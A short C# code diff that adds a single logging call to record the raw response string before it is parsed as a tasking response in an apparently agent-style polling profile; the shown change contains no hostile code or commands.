@@ -140,6 +140,7 @@ namespace Agent.Profiles
                         continue;
                     }
 
+                    logger.Log(responseString);
                     GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                     if (gtr == null)
                     {
